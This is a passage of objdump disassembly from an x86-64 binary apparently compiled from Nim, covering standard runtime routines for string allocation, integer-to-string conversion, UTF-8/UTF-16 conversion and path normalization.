  403f7c:	8a 54 0b 03          	mov    0x3(%rbx,%rcx,1),%dl
  403f80:	49 c1 e4 12          	shl    $0x12,%r12
  403f84:	41 81 e4 00 00 1c 00 	and    $0x1c0000,%r12d
  403f8b:	83 e2 3f             	and    $0x3f,%edx
  403f8e:	4c 09 e2             	or     %r12,%rdx
  403f91:	44 0f b6 64 0b 01    	movzbl 0x1(%rbx,%rcx,1),%r12d
  403f97:	49 c1 e4 0c          	shl    $0xc,%r12
  403f9b:	41 81 e4 00 f0 03 00 	and    $0x3f000,%r12d
  403fa2:	4c 09 e2             	or     %r12,%rdx
  403fa5:	44 0f b6 64 0b 02    	movzbl 0x2(%rbx,%rcx,1),%r12d
  403fab:	48 83 c1 04          	add    $0x4,%rcx
  403faf:	49 c1 e4 06          	shl    $0x6,%r12
  403fb3:	41 81 e4 c0 0f 00 00 	and    $0xfc0,%r12d
  403fba:	4c 09 e2             	or     %r12,%rdx
  403fbd:	48 81 fa ff ff 00 00 	cmp    $0xffff,%rdx
  403fc4:	7e 37                	jle    403ffd <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x17d>
  403fc6:	48 81 fa ff ff 10 00 	cmp    $0x10ffff,%rdx
  403fcd:	7f 46                	jg     404015 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x195>
  403fcf:	48 81 ea 00 00 01 00 	sub    $0x10000,%rdx
  403fd6:	49 ff c0             	inc    %r8
  403fd9:	49 89 d4             	mov    %rdx,%r12
  403fdc:	66 81 e2 ff 03       	and    $0x3ff,%dx
  403fe1:	49 c1 fc 0a          	sar    $0xa,%r12
  403fe5:	66 81 ea 00 24       	sub    $0x2400,%dx
  403fea:	66 41 81 ec 00 28    	sub    $0x2800,%r12w
  403ff0:	66 44 89 65 00       	mov    %r12w,0x0(%rbp)
  403ff5:	66 42 89 54 08 02    	mov    %dx,0x2(%rax,%r9,1)
  403ffb:	eb 1e                	jmp    40401b <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x19b>
  403ffd:	48 81 fa ff d7 00 00 	cmp    $0xd7ff,%rdx
  404004:	7e 09                	jle    40400f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x18f>
  404006:	48 81 fa ff df 00 00 	cmp    $0xdfff,%rdx
  40400d:	7e 06                	jle    404015 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x195>
  40400f:	66 89 55 00          	mov    %dx,0x0(%rbp)
  404013:	eb 06                	jmp    40401b <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x19b>
  404015:	66 c7 45 00 fd ff    	movw   $0xfffd,0x0(%rbp)
  40401b:	49 ff c0             	inc    %r8
  40401e:	e9 9a fe ff ff       	jmp    403ebd <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x3d>
  404023:	66 c7 45 00 00 00    	movw   $0x0,0x0(%rbp)
  404029:	48 83 c4 20          	add    $0x20,%rsp
  40402d:	5b                   	pop    %rbx
  40402e:	5e                   	pop    %rsi
  40402f:	5f                   	pop    %rdi
  404030:	5d                   	pop    %rbp
  404031:	41 5c                	pop    %r12
  404033:	c3                   	ret

0000000000404034 <newWideCString__rFkWhJjmVi0m0Hc9agVEZIQ>:
  404034:	48 83 ec 28          	sub    $0x28,%rsp
  404038:	31 d2                	xor    %edx,%edx
  40403a:	48 85 c9             	test   %rcx,%rcx
  40403d:	74 03                	je     404042 <newWideCString__rFkWhJjmVi0m0Hc9agVEZIQ+0xe>
  40403f:	48 8b 11             	mov    (%rcx),%rdx
  404042:	e8 0a d5 ff ff       	call   401551 <nimToCStringConv.lto_priv.53>
  404047:	48 89 c1             	mov    %rax,%rcx
  40404a:	48 83 c4 28          	add    $0x28,%rsp
  40404e:	e9 2d fe ff ff       	jmp    403e80 <newWideCString__K8rR70TBwrP6FNBzDhVVOA>

0000000000404053 <rawNewStringNoInit>:
  404053:	57                   	push   %rdi
  404054:	56                   	push   %rsi
  404055:	53                   	push   %rbx
  404056:	48 83 ec 20          	sub    $0x20,%rsp
  40405a:	be 07 00 00 00       	mov    $0x7,%esi
  40405f:	48 83 f9 07          	cmp    $0x7,%rcx
  404063:	48 0f 4d f1          	cmovge %rcx,%rsi
  404067:	e8 34 dc ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  40406c:	48 8d 78 38          	lea    0x38(%rax),%rdi
  404070:	48 89 c3             	mov    %rax,%rbx
  404073:	48 89 f9             	mov    %rdi,%rcx
  404076:	e8 65 f7 ff ff       	call   4037e0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg>
  40407b:	48 8d 56 21          	lea    0x21(%rsi),%rdx
  40407f:	48 8d 8b a0 00 00 00 	lea    0xa0(%rbx),%rcx
  404086:	e8 dc e8 ff ff       	call   402967 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ>
  40408b:	48 89 fa             	mov    %rdi,%rdx
  40408e:	48 89 c3             	mov    %rax,%rbx
  404091:	48 8d 05 88 6f 00 00 	lea    0x6f88(%rip),%rax        # 40b020 <strDesc__D0UzA4zsDu5tgpJQ9a9clXPg>
  404098:	48 c7 03 04 00 00 00 	movq   $0x4,(%rbx)
  40409f:	48 89 d9             	mov    %rbx,%rcx
  4040a2:	48 89 43 08          	mov    %rax,0x8(%rbx)
  4040a6:	e8 20 eb ff ff       	call   402bcb <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.47>
  4040ab:	48 8d 43 10          	lea    0x10(%rbx),%rax
  4040af:	48 89 70 08          	mov    %rsi,0x8(%rax)
  4040b3:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  4040ba:	00 
  4040bb:	48 83 c4 20          	add    $0x20,%rsp
  4040bf:	5b                   	pop    %rbx
  4040c0:	5e                   	pop    %rsi
  4040c1:	5f                   	pop    %rdi
  4040c2:	c3                   	ret

00000000004040c3 <copyString>:
  4040c3:	57                   	push   %rdi
  4040c4:	56                   	push   %rsi
  4040c5:	48 83 ec 28          	sub    $0x28,%rsp
  4040c9:	48 85 c9             	test   %rcx,%rcx
  4040cc:	48 89 ce             	mov    %rcx,%rsi
  4040cf:	74 29                	je     4040fa <copyString+0x37>
  4040d1:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
  4040d6:	78 22                	js     4040fa <copyString+0x37>
  4040d8:	48 8b 09             	mov    (%rcx),%rcx
  4040db:	48 83 c6 10          	add    $0x10,%rsi
  4040df:	e8 6f ff ff ff       	call   404053 <rawNewStringNoInit>
  4040e4:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
  4040e8:	48 8d 50 10          	lea    0x10(%rax),%rdx
  4040ec:	48 89 d7             	mov    %rdx,%rdi
  4040ef:	48 89 08             	mov    %rcx,(%rax)
  4040f2:	48 ff c1             	inc    %rcx
  4040f5:	f3 a4                	rep movsb (%rsi),(%rdi)
  4040f7:	48 89 c6             	mov    %rax,%rsi
  4040fa:	48 89 f0             	mov    %rsi,%rax
  4040fd:	48 83 c4 28          	add    $0x28,%rsp
  404101:	5e                   	pop    %rsi
  404102:	5f                   	pop    %rdi
  404103:	c3                   	ret

0000000000404104 <setLengthStr>:
  404104:	41 55                	push   %r13
  404106:	41 54                	push   %r12
  404108:	55                   	push   %rbp
  404109:	57                   	push   %rdi
  40410a:	56                   	push   %rsi
  40410b:	53                   	push   %rbx
  40410c:	48 83 ec 28          	sub    $0x28,%rsp
  404110:	41 bc 00 00 00 00    	mov    $0x0,%r12d
  404116:	48 85 d2             	test   %rdx,%rdx
  404119:	48 89 cb             	mov    %rcx,%rbx
  40411c:	48 89 d5             	mov    %rdx,%rbp
  40411f:	4c 0f 49 e2          	cmovns %rdx,%r12
  404123:	48 85 c9             	test   %rcx,%rcx
  404126:	74 60                	je     404188 <setLengthStr+0x84>
  404128:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  40412f:	ff ff 3f 
  404132:	48 23 4b 08          	and    0x8(%rbx),%rcx
  404136:	4c 39 e1             	cmp    %r12,%rcx
  404139:	7d 5b                	jge    404196 <setLengthStr+0x92>
  40413b:	e8 9d d4 ff ff       	call   4015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>
  404140:	48 8d 73 10          	lea    0x10(%rbx),%rsi
  404144:	48 39 c5             	cmp    %rax,%rbp
  404147:	48 0f 4d c5          	cmovge %rbp,%rax
  40414b:	48 89 c1             	mov    %rax,%rcx
  40414e:	49 89 c5             	mov    %rax,%r13
  404151:	e8 fd fe ff ff       	call   404053 <rawNewStringNoInit>
  404156:	48 8b 0b             	mov    (%rbx),%rcx
  404159:	48 89 ea             	mov    %rbp,%rdx
  40415c:	49 89 c1             	mov    %rax,%r9
  40415f:	48 8d 40 10          	lea    0x10(%rax),%rax
  404163:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
  404167:	48 89 c7             	mov    %rax,%rdi
  40416a:	48 ff c1             	inc    %rcx
  40416d:	f3 a4                	rep movsb (%rsi),(%rdi)
  40416f:	48 8b 03             	mov    (%rbx),%rax
  404172:	49 8d 4c 01 10       	lea    0x10(%r9,%rax,1),%rcx
  404177:	48 29 c2             	sub    %rax,%rdx
  40417a:	e8 43 d8 ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  40417f:	4d 89 69 08          	mov    %r13,0x8(%r9)
  404183:	4c 89 cb             	mov    %r9,%rbx
  404186:	eb 0e                	jmp    404196 <setLengthStr+0x92>
  404188:	48 89 d1             	mov    %rdx,%rcx
  40418b:	e8 bc fb ff ff       	call   403d4c <rawNewString>
  404190:	48 89 c3             	mov    %rax,%rbx
  404193:	48 89 28             	mov    %rbp,(%rax)
  404196:	48 89 d8             	mov    %rbx,%rax
  404199:	4c 89 23             	mov    %r12,(%rbx)
  40419c:	42 c6 44 23 10 00    	movb   $0x0,0x10(%rbx,%r12,1)
  4041a2:	48 83 c4 28          	add    $0x28,%rsp
  4041a6:	5b                   	pop    %rbx
  4041a7:	5e                   	pop    %rsi
  4041a8:	5f                   	pop    %rdi
  4041a9:	5d                   	pop    %rbp
  4041aa:	41 5c                	pop    %r12
  4041ac:	41 5d                	pop    %r13
  4041ae:	c3                   	ret

00000000004041af <nimIntToStr>:
  4041af:	41 56                	push   %r14
  4041b1:	41 55                	push   %r13
  4041b3:	41 54                	push   %r12
  4041b5:	55                   	push   %rbp
  4041b6:	57                   	push   %rdi
  4041b7:	56                   	push   %rsi
  4041b8:	53                   	push   %rbx
  4041b9:	48 83 ec 30          	sub    $0x30,%rsp
  4041bd:	31 f6                	xor    %esi,%esi
  4041bf:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  4041c6:	00 00 
  4041c8:	48 89 cb             	mov    %rcx,%rbx
  4041cb:	b9 20 00 00 00       	mov    $0x20,%ecx
  4041d0:	e8 77 fb ff ff       	call   403d4c <rawNewString>
  4041d5:	48 85 c0             	test   %rax,%rax
  4041d8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  4041dd:	74 03                	je     4041e2 <nimIntToStr+0x33>
  4041df:	48 8b 30             	mov    (%rax),%rsi
  4041e2:	48 8d 56 20          	lea    0x20(%rsi),%rdx
  4041e6:	48 89 c1             	mov    %rax,%rcx
  4041e9:	41 bc 0a 00 00 00    	mov    $0xa,%r12d
  4041ef:	e8 10 ff ff ff       	call   404104 <setLengthStr>
  4041f4:	48 8d 6c 24 28       	lea    0x28(%rsp),%rbp
  4041f9:	41 b5 0a             	mov    $0xa,%r13b
  4041fc:	41 b6 30             	mov    $0x30,%r14b
  4041ff:	48 89 e9             	mov    %rbp,%rcx
  404202:	48 89 c2             	mov    %rax,%rdx
  404205:	e8 b8 ec ff ff       	call   402ec2 <unsureAsgnRef>
  40420a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  40420f:	49 89 d8             	mov    %rbx,%r8
  404212:	45 31 c9             	xor    %r9d,%r9d
  404215:	4c 8d 1c 31          	lea    (%rcx,%rsi,1),%r11
  404219:	4c 89 c0             	mov    %r8,%rax
  40421c:	48 99                	cqto
  40421e:	49 f7 fc             	idiv   %r12
  404221:	49 89 c2             	mov    %rax,%r10
  404224:	44 89 e8             	mov    %r13d,%eax
  404227:	49 6b d2 f6          	imul   $0xfffffffffffffff6,%r10,%rdx
  40422b:	41 0f af c2          	imul   %r10d,%eax
  40422f:	4c 01 c2             	add    %r8,%rdx
  404232:	48 85 d2             	test   %rdx,%rdx
  404235:	7e 09                	jle    404240 <nimIntToStr+0x91>
  404237:	41 83 c0 30          	add    $0x30,%r8d
  40423b:	41 29 c0             	sub    %eax,%r8d
  40423e:	eb 0c                	jmp    40424c <nimIntToStr+0x9d>
  404240:	44 89 f7             	mov    %r14d,%edi
  404243:	44 29 c7             	sub    %r8d,%edi
  404246:	41 89 f8             	mov    %edi,%r8d
  404249:	41 01 c0             	add    %eax,%r8d
  40424c:	47 88 44 0b 10       	mov    %r8b,0x10(%r11,%r9,1)
  404251:	49 8d 79 01          	lea    0x1(%r9),%rdi
  404255:	4d 85 d2             	test   %r10,%r10
  404258:	4d 89 d0             	mov    %r10,%r8
  40425b:	74 05                	je     404262 <nimIntToStr+0xb3>
  40425d:	49 89 f9             	mov    %rdi,%r9
  404260:	eb b7                	jmp    404219 <nimIntToStr+0x6a>
  404262:	48 85 db             	test   %rbx,%rbx
  404265:	79 0a                	jns    404271 <nimIntToStr+0xc2>
  404267:	42 c6 44 1f 10 2d    	movb   $0x2d,0x10(%rdi,%r11,1)
  40426d:	49 8d 79 02          	lea    0x2(%r9),%rdi
  404271:	48 8d 1c 3e          	lea    (%rsi,%rdi,1),%rbx
  404275:	48 d1 ff             	sar    $1,%rdi
  404278:	48 89 da             	mov    %rbx,%rdx
  40427b:	e8 84 fe ff ff       	call   404104 <setLengthStr>
  404280:	48 89 e9             	mov    %rbp,%rcx
  404283:	48 89 c2             	mov    %rax,%rdx
  404286:	e8 37 ec ff ff       	call   402ec2 <unsureAsgnRef>
  40428b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  404290:	49 89 f8             	mov    %rdi,%r8
  404293:	48 8d 0c 30          	lea    (%rax,%rsi,1),%rcx
  404297:	48 8d 14 18          	lea    (%rax,%rbx,1),%rdx
  40429b:	49 01 c8             	add    %rcx,%r8
  40429e:	48 ff ca             	dec    %rdx
  4042a1:	49 39 c8             	cmp    %rcx,%r8
  4042a4:	74 15                	je     4042bb <nimIntToStr+0x10c>
  4042a6:	44 8a 49 10          	mov    0x10(%rcx),%r9b
  4042aa:	48 ff c1             	inc    %rcx
  4042ad:	44 8a 52 10          	mov    0x10(%rdx),%r10b
  4042b1:	44 88 51 0f          	mov    %r10b,0xf(%rcx)
  4042b5:	44 88 4a 10          	mov    %r9b,0x10(%rdx)
  4042b9:	eb e3                	jmp    40429e <nimIntToStr+0xef>
  4042bb:	48 83 c4 30          	add    $0x30,%rsp
  4042bf:	5b                   	pop    %rbx
  4042c0:	5e                   	pop    %rsi
  4042c1:	5f                   	pop    %rdi
  4042c2:	5d                   	pop    %rbp
  4042c3:	41 5c                	pop    %r12
  4042c5:	41 5d                	pop    %r13
  4042c7:	41 5e                	pop    %r14
  4042c9:	c3                   	ret

00000000004042ca <addChar>:
  4042ca:	55                   	push   %rbp
  4042cb:	57                   	push   %rdi
  4042cc:	56                   	push   %rsi
  4042cd:	53                   	push   %rbx
  4042ce:	48 83 ec 28          	sub    $0x28,%rsp
  4042d2:	48 85 c9             	test   %rcx,%rcx
  4042d5:	48 89 ce             	mov    %rcx,%rsi
  4042d8:	89 d3                	mov    %edx,%ebx
  4042da:	74 43                	je     40431f <addChar+0x55>
  4042dc:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  4042e3:	ff ff 3f 
  4042e6:	48 23 4e 08          	and    0x8(%rsi),%rcx
  4042ea:	48 3b 0e             	cmp    (%rsi),%rcx
  4042ed:	7f 44                	jg     404333 <addChar+0x69>
  4042ef:	e8 e9 d2 ff ff       	call   4015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>
  4042f4:	48 83 c6 10          	add    $0x10,%rsi
  4042f8:	48 89 c1             	mov    %rax,%rcx
  4042fb:	48 89 c5             	mov    %rax,%rbp
  4042fe:	e8 50 fd ff ff       	call   404053 <rawNewStringNoInit>
  404303:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
  404307:	48 8d 50 10          	lea    0x10(%rax),%rdx
  40430b:	48 89 d7             	mov    %rdx,%rdi
  40430e:	48 89 08             	mov    %rcx,(%rax)
  404311:	48 ff c1             	inc    %rcx
  404314:	f3 a4                	rep movsb (%rsi),(%rdi)
  404316:	48 89 68 08          	mov    %rbp,0x8(%rax)
  40431a:	48 89 c6             	mov    %rax,%rsi
  40431d:	eb 14                	jmp    404333 <addChar+0x69>
  40431f:	b9 01 00 00 00       	mov    $0x1,%ecx
  404324:	e8 2a fd ff ff       	call   404053 <rawNewStringNoInit>
  404329:	48 89 c6             	mov    %rax,%rsi
  40432c:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  404333:	48 8b 06             	mov    (%rsi),%rax
  404336:	88 5c 06 10          	mov    %bl,0x10(%rsi,%rax,1)
  40433a:	c6 44 06 11 00       	movb   $0x0,0x11(%rsi,%rax,1)
  40433f:	48 ff c0             	inc    %rax
  404342:	48 89 06             	mov    %rax,(%rsi)
  404345:	48 89 f0             	mov    %rsi,%rax
  404348:	48 83 c4 28          	add    $0x28,%rsp
  40434c:	5b                   	pop    %rbx
  40434d:	5e                   	pop    %rsi
  40434e:	5f                   	pop    %rdi
  40434f:	5d                   	pop    %rbp
  404350:	c3                   	ret

0000000000404351 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44>:
  404351:	55                   	push   %rbp
  404352:	57                   	push   %rdi
  404353:	56                   	push   %rsi
  404354:	53                   	push   %rbx
  404355:	48 83 ec 28          	sub    $0x28,%rsp
  404359:	48 89 cd             	mov    %rcx,%rbp
  40435c:	48 89 d1             	mov    %rdx,%rcx
  40435f:	48 c1 f9 02          	sar    $0x2,%rcx
  404363:	48 01 d1             	add    %rdx,%rcx
  404366:	e8 e1 f9 ff ff       	call   403d4c <rawNewString>
  40436b:	31 c9                	xor    %ecx,%ecx
  40436d:	48 8d 14 09          	lea    (%rcx,%rcx,1),%rdx
  404371:	66 8b 74 15 00       	mov    0x0(%rbp,%rdx,1),%si
  404376:	66 85 f6             	test   %si,%si
  404379:	0f 84 39 01 00 00    	je     4044b8 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x167>
  40437f:	48 8d 79 01          	lea    0x1(%rcx),%rdi
  404383:	66 81 fe ff d7       	cmp    $0xd7ff,%si
  404388:	0f b7 de             	movzwl %si,%ebx
  40438b:	77 0b                	ja     404398 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x47>
  40438d:	48 81 fb ff d7 00 00 	cmp    $0xd7ff,%rbx
  404394:	7f 2c                	jg     4043c2 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x71>
  404396:	eb 1e                	jmp    4043b6 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x65>
  404398:	48 81 fb ff db 00 00 	cmp    $0xdbff,%rbx
  40439f:	7e 21                	jle    4043c2 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x71>
  4043a1:	48 81 fb ff df 00 00 	cmp    $0xdfff,%rbx
  4043a8:	0f 9e c2             	setle  %dl
  4043ab:	66 81 fe ff db       	cmp    $0xdbff,%si
  4043b0:	0f 87 80 00 00 00    	ja     404436 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0xe5>
  4043b6:	48 81 fb ff db 00 00 	cmp    $0xdbff,%rbx
  4043bd:	0f 9f c2             	setg   %dl
  4043c0:	eb 74                	jmp    404436 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0xe5>
  4043c2:	44 0f b7 44 15 02    	movzwl 0x2(%rbp,%rdx,1),%r8d
  4043c8:	66 41 81 f8 ff db    	cmp    $0xdbff,%r8w
  4043ce:	4c 89 c2             	mov    %r8,%rdx
  4043d1:	77 0d                	ja     4043e0 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x8f>
  4043d3:	49 81 f8 ff db 00 00 	cmp    $0xdbff,%r8
  4043da:	41 0f 9f c0          	setg   %r8b
  4043de:	eb 0b                	jmp    4043eb <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x9a>
  4043e0:	49 81 f8 ff df 00 00 	cmp    $0xdfff,%r8
  4043e7:	41 0f 9e c0          	setle  %r8b
  4043eb:	45 84 c0             	test   %r8b,%r8b
  4043ee:	0f 84 87 00 00 00    	je     40447b <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x12a>
  4043f4:	48 8d 79 02          	lea    0x2(%rcx),%rdi
  4043f8:	48 c1 e3 0a          	shl    $0xa,%rbx
  4043fc:	81 e2 ff 03 00 00    	and    $0x3ff,%edx
  404402:	81 e3 00 fc 0f 00    	and    $0xffc00,%ebx
  404408:	48 89 c1             	mov    %rax,%rcx
  40440b:	48 09 d3             	or     %rdx,%rbx
  40440e:	48 81 c3 00 00 01 00 	add    $0x10000,%rbx
  404415:	48 89 da             	mov    %rbx,%rdx
  404418:	48 c1 fa 12          	sar    $0x12,%rdx
  40441c:	83 ca f0             	or     $0xfffffff0,%edx
  40441f:	0f be d2             	movsbl %dl,%edx
  404422:	e8 a3 fe ff ff       	call   4042ca <addChar>
  404427:	48 89 da             	mov    %rbx,%rdx
  40442a:	48 c1 fa 0c          	sar    $0xc,%rdx
  40442e:	83 e2 3f             	and    $0x3f,%edx
  404431:	83 ca 80             	or     $0xffffff80,%edx
  404434:	eb 54                	jmp    40448a <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x139>
  404436:	84 d2                	test   %dl,%dl
  404438:	75 41                	jne    40447b <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x12a>
  40443a:	66 83 fe 7f          	cmp    $0x7f,%si
  40443e:	0f b7 d6             	movzwl %si,%edx
  404441:	76 28                	jbe    40446b <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x11a>
  404443:	48 89 da             	mov    %rbx,%rdx
  404446:	48 c1 fa 06          	sar    $0x6,%rdx
  40444a:	48 81 fb ff 07 00 00 	cmp    $0x7ff,%rbx
  404451:	7f 2d                	jg     404480 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x12f>
  404453:	83 ca c0             	or     $0xffffffc0,%edx
  404456:	83 e6 3f             	and    $0x3f,%esi
  404459:	48 89 c1             	mov    %rax,%rcx
  40445c:	0f be d2             	movsbl %dl,%edx
  40445f:	83 ce 80             	or     $0xffffff80,%esi
  404462:	e8 63 fe ff ff       	call   4042ca <addChar>
  404467:	40 0f be d6          	movsbl %sil,%edx
  40446b:	48 89 c1             	mov    %rax,%rcx
  40446e:	e8 57 fe ff ff       	call   4042ca <addChar>
  404473:	48 89 f9             	mov    %rdi,%rcx
  404476:	e9 f2 fe ff ff       	jmp    40436d <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x1c>
  40447b:	bb fd ff 00 00       	mov    $0xfffd,%ebx
  404480:	48 89 da             	mov    %rbx,%rdx
  404483:	48 c1 fa 0c          	sar    $0xc,%rdx
  404487:	83 ca e0             	or     $0xffffffe0,%edx
  40448a:	0f be d2             	movsbl %dl,%edx
  40448d:	48 89 c1             	mov    %rax,%rcx
  404490:	e8 35 fe ff ff       	call   4042ca <addChar>
  404495:	48 89 da             	mov    %rbx,%rdx
  404498:	83 e3 3f             	and    $0x3f,%ebx
  40449b:	48 c1 fa 06          	sar    $0x6,%rdx
  40449f:	48 89 c1             	mov    %rax,%rcx
  4044a2:	83 cb 80             	or     $0xffffff80,%ebx
  4044a5:	83 e2 3f             	and    $0x3f,%edx
  4044a8:	83 ca 80             	or     $0xffffff80,%edx
  4044ab:	0f be d2             	movsbl %dl,%edx
  4044ae:	e8 17 fe ff ff       	call   4042ca <addChar>
  4044b3:	0f be d3             	movsbl %bl,%edx
  4044b6:	eb b3                	jmp    40446b <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44+0x11a>
  4044b8:	48 83 c4 28          	add    $0x28,%rsp
  4044bc:	5b                   	pop    %rbx
  4044bd:	5e                   	pop    %rsi
  4044be:	5f                   	pop    %rdi
  4044bf:	5d                   	pop    %rbp
  4044c0:	c3                   	ret

00000000004044c1 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg>:
  4044c1:	53                   	push   %rbx
  4044c2:	48 83 ec 20          	sub    $0x20,%rsp
  4044c6:	48 89 cb             	mov    %rcx,%rbx
  4044c9:	48 8b 09             	mov    (%rcx),%rcx
  4044cc:	41 89 d1             	mov    %edx,%r9d
  4044cf:	48 85 c9             	test   %rcx,%rcx
  4044d2:	0f 84 96 00 00 00    	je     40456e <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0xad>
  4044d8:	48 8b 11             	mov    (%rcx),%rdx
  4044db:	48 85 d2             	test   %rdx,%rdx
  4044de:	0f 84 8a 00 00 00    	je     40456e <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0xad>
  4044e4:	48 85 d2             	test   %rdx,%rdx
  4044e7:	7e 39                	jle    404522 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x61>
  4044e9:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
  4044ed:	44 8a 44 01 10       	mov    0x10(%rcx,%rax,1),%r8b
  4044f2:	41 80 f8 5c          	cmp    $0x5c,%r8b
  4044f6:	75 05                	jne    4044fd <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x3c>
  4044f8:	48 89 c2             	mov    %rax,%rdx
  4044fb:	eb e7                	jmp    4044e4 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x23>
  4044fd:	41 80 f8 2f          	cmp    $0x2f,%r8b
  404501:	74 f5                	je     4044f8 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x37>
  404503:	41 80 f8 2e          	cmp    $0x2e,%r8b
  404507:	75 4b                	jne    404554 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x93>
  404509:	48 83 fa 01          	cmp    $0x1,%rdx
  40450d:	7e 45                	jle    404554 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x93>
  40450f:	44 8a 44 01 0f       	mov    0xf(%rcx,%rax,1),%r8b
  404514:	41 80 f8 5c          	cmp    $0x5c,%r8b
  404518:	74 de                	je     4044f8 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x37>
  40451a:	41 80 f8 2f          	cmp    $0x2f,%r8b
  40451e:	74 d8                	je     4044f8 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x37>
  404520:	eb 32                	jmp    404554 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x93>
  404522:	45 84 c9             	test   %r9b,%r9b
  404525:	74 1f                	je     404546 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x85>
  404527:	e8 d8 fb ff ff       	call   404104 <setLengthStr>
  40452c:	48 89 d9             	mov    %rbx,%rcx
  40452f:	48 89 c2             	mov    %rax,%rdx
  404532:	e8 8b e9 ff ff       	call   402ec2 <unsureAsgnRef>
  404537:	48 8b 0b             	mov    (%rbx),%rcx
  40453a:	ba 5c 00 00 00       	mov    $0x5c,%edx
  40453f:	e8 86 fd ff ff       	call   4042ca <addChar>
  404544:	eb 18                	jmp    40455e <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x9d>
  404546:	48 8d 0d 23 ce 00 00 	lea    0xce23(%rip),%rcx        # 411370 <TM__yu6cxgKBBXbNsTkT9cyMd4g_6>
  40454d:	e8 71 fb ff ff       	call   4040c3 <copyString>
  404552:	eb 0a                	jmp    40455e <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x9d>
  404554:	45 84 c9             	test   %r9b,%r9b
  404557:	75 ce                	jne    404527 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x66>
  404559:	e8 a6 fb ff ff       	call   404104 <setLengthStr>
  40455e:	48 89 c2             	mov    %rax,%rdx
  404561:	48 89 d9             	mov    %rbx,%rcx
  404564:	48 83 c4 20          	add    $0x20,%rsp
  404568:	5b                   	pop    %rbx
  404569:	e9 54 e9 ff ff       	jmp    402ec2 <unsureAsgnRef>
  40456e:	48 83 c4 20          	add    $0x20,%rsp
  404572:	5b                   	pop    %rbx
  404573:	c3                   	ret

0000000000404574 <add__8FwY5enLGB0dFerO6Ny9caw.part.19>:
  404574:	56                   	push   %rsi
  404575:	53                   	push   %rbx
  404576:	48 83 ec 28          	sub    $0x28,%rsp
  40457a:	48 89 ce             	mov    %rcx,%rsi
  40457d:	48 89 d3             	mov    %rdx,%rbx
  404580:	48 ff c3             	inc    %rbx
  404583:	0f be 53 ff          	movsbl -0x1(%rbx),%edx
  404587:	84 d2                	test   %dl,%dl
  404589:	74 15                	je     4045a0 <add__8FwY5enLGB0dFerO6Ny9caw.part.19+0x2c>
  40458b:	48 8b 0e             	mov    (%rsi),%rcx
  40458e:	e8 37 fd ff ff       	call   4042ca <addChar>
  404593:	48 89 f1             	mov    %rsi,%rcx
  404596:	48 89 c2             	mov    %rax,%rdx
  404599:	e8 24 e9 ff ff       	call   402ec2 <unsureAsgnRef>
  40459e:	eb e0                	jmp    404580 <add__8FwY5enLGB0dFerO6Ny9caw.part.19+0xc>
  4045a0:	48 83 c4 28          	add    $0x28,%rsp
  4045a4:	5b                   	pop    %rbx
  4045a5:	5e                   	pop    %rsi
